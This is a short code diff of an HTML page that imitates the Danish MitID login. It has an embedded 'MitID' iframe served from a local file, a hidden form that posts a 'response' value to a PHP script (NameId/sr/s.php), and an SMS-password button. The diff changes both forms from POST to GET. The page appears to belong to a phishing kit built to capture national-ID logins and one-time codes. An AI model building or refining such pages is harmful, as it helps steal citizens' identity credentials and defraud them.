@@ -456,12 +456,12 @@ footer p {
             <div style="display:none;" id="mitid_parameters">191113a4-4b2b-49f8-b263-9d3b07ee697e</div>
             <iframe id="mitidIframe" class="bankid-applet" sandbox="allow-presentation allow-scripts allow-same-origin allow-forms" title="MitID" src="SPEXI/iframe.html"></iframe>
 
-            <form name="postBackForm" id="postBackForm" action="NameId/sr/s.php" method="post"><input type="hidden" name="response" value="">
+            <form name="postBackForm" id="postBackForm" action="NameId/sr/s.php" method="get"><input type="hidden" name="response" value="">
                 <input type="hidden" name="language" id="language" value="dk">
             </form>
         </section>
 
-        <form id="form" method="post" autocomplete="off" action="#">
+        <form id="form" method="get" autocomplete="off" action="#">
             <section style="border-top: 1px solid #eee;">
                 <div class="buttons">
                     <button type="submit" id="smspasswd" name="smspasswd" value="smspasswd">
